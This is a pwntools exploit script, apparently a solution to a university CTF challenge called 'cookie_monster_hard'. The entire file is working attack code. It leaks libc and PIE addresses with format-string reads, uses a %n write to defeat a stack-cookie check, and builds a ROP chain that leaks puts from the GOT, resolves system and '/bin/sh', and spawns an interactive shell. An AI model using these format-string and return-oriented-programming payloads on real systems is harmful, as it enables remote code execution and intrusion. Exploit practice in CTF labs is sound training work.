from pwn import *

r = remote('ctf99.cs.ui.ac.id', 9136)
# r = process('./cookie_monster_hard')

context.arch = 'amd64'
e = ELF('./cookie_monster_hard')
rop = ROP(e)

# VAR
PUTS = e.plt['puts']
VULN = e.sym['vuln']
PUTS_GOT = e.got['puts'] # 0x601018
POP_RET = rop.find_gadget(['pop rdi', 'ret'])[0] # 0xc03 # pop rdi ; ret rdi itu utk param 1


# SYSTEM = 0x7ffff7a33440
# BINSH = 0x7ffff7b97e9a
print('puts:', hex(PUTS))
print('puts_got:', hex(PUTS_GOT))
print('pop_ret:', hex(POP_RET))

print(r.recvline())
print(r.recvline())
print(r.recvline())


payload = '%17$lx %13$lx'
r.sendline(payload)
print(r.recvuntil('testimony: '))
leak = int(r.recv(12),16)
leak2 = int(r.recv(13)[1:], 16)
print(hex(leak), 'leak')
print(hex(leak2), 'leak2')
base_libc = leak - 0x620
pie = leak2 - 0xd60
print(hex(base_libc))
print(hex(pie))
cookie_address = pie + 0x20209c
print(hex(cookie_address), 'cookie_address')
# PIE, OFFSET 0xd60
# pie = int(r.recv(12).strip(),16)
# print(hex(pie))
# pie = pie - 0xd60
# print(hex(pie))

r.sendline('y')
# print(hex(cookie_address), 'cookie_address')
# payload = p64(cookie_address) + '%8$lx'

# cookie_address = 0x55555575609c
payload = '%9$nAAAA' + p64(cookie_address) + 'A'*92 + p32(int('0', 16)) + 'B'*8 + p64(pie + POP_RET) + p64(pie + PUTS_GOT) + p64(pie + PUTS) + p64(pie + VULN)
# for i in list(payload):
# 	print i
r.sendline(payload)
# with open('payload', 'wb') as f:
# 	f.write(payload)
# print(r.recvuntil('testimony: '))
# leak = int(r.recv(4),16)
# leak = int(r.recv(6),16)
# leak2 = r.recv(8)
# leak2 = r.recv(17)[1:]
# print(hex(leak), 'leak')
r.sendline('n')
# r.sendline('bla')




# r.sendline(payload)
# r.recv(10)
print(r.recvuntil('Thank you!'))
LEAK = r.recv(6)
print(len(LEAK))
LEAK = u64(LEAK.ljust(8, b'\x00'))
print(hex(LEAK))

libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
PUTS_OFFSET = libc.symbols['puts']
print('PUTS_OFFSET', hex(PUTS_OFFSET))
LIBC_BASE = LEAK - PUTS_OFFSET
print(hex(LIBC_BASE))

SYSTEM_OFFSET = libc.symbols['system']
BINSH_OFFSET = list(libc.search(b'/bin/sh'))[0]

SYSTEM = LIBC_BASE + SYSTEM_OFFSET
BINSH = LIBC_BASE + BINSH_OFFSET
print(hex(SYSTEM))
print(hex(BINSH))

# r.sendline('a')
# r.recvline()
# r.recv(1)
payload = '%9$nAAAA' + p64(cookie_address) + 'A'*92 + p32(int('0', 16)) + 'B'*8 + p64(pie + POP_RET) + p64(BINSH) + p64(SYSTEM)
# payload = 'A'*108  + p32(int(cookie[:8], 16)) + 'B'*8 + p64(POP_RET) + p64(PUTS_GOT) + p64(PUTS) + p64(VULN)
r.sendline(payload)
# print(r.recvuntil('Thank you!'))
# r.sendline(payload)
# r.sendline(payload)
r.interactive()










